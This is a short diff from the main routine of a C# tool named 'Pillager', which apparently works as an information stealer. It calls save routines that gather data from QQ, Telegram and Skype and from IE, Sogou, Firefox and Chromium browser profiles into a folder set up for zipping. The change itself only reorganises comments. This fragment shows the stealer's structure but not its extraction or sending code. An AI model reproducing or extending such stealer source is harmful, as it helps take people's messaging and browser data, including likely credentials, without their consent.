@@ -17,22 +17,15 @@ namespace Pillager
             if (File.Exists(savezippath)) File.Delete(savezippath);
             Directory.CreateDirectory(savepath);
 
+            //IM
             QQ.Save(savepath);
-
             Telegram.Save(savepath);
-
             Skype.Save(savepath);
 
-            //IE
+            //Browser
             IE.Save(savepath);
-
-            //SogouExplorer < 12.x
-            OldSogou.Save(savepath);
-
-            //FireFox
+            OldSogou.Save(savepath);//SogouExplorer < 12.x
             FireFox.Save(savepath);
-
-            //Chrome
             List<List<string>> browserOnChromium = new List<List<string>>()
             {
                 new List<string>() { "Chrome", "Google\\Chrome\\User Data\\Default" } ,
